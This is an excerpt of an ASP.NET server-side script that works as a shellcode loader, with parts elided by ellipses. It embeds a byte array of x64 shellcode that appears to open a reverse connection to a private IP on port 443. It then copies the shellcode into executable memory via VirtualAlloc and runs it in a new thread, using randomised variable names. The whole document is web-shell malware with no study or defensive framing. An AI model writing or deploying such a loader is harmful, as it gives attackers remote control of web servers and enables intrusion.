...
<script runat="server">
    ...
    {
        byte[] oGw5T = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
...
0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xbb,
0xc0,0xa8,0x2d,0xba,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,
...
0x59,0x41,0x89,0xda,0xff,0xd5};
        ...
        IntPtr v_WJgsct = VirtualAlloc(IntPtr.Zero,(UIntPtr)oGw5T.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(oGw5T,0,v_WJgsct,oGw5T.Length);
        IntPtr x9kj = IntPtr.Zero;
        IntPtr xgVnc8sEO = CreateThread(IntPtr.Zero,UIntPtr.Zero,v_WJgsct,IntPtr.Zero,0,ref x9kj);
    }
</script>
